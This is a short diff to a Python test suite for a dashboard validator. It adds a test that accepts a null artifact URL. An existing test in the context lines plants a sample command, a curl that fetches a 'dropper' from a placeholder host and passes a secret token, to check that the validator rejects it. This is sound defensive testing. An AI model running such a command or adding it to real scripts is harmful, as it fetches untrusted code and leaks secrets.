@@ -83,6 +83,11 @@ class DashboardValidationTests(unittest.TestCase):
         errors = validate_dashboard.validate(snapshot)
         self.assertTrue(any("must not contain user information" in error for error in errors))
 
+    def test_withheld_malformed_artifact_url_is_accepted_as_null(self):
+        snapshot = self.load()
+        snapshot["artifacts"][0]["url"] = None
+        self.assertEqual(validate_dashboard.validate(snapshot), [])
+
     def test_embedded_url_query_is_rejected_outside_artifact_table(self):
         snapshot = self.load()
         snapshot["commands"][0]["command"] = "curl https://payload.example.invalid/dropper?token=secret"
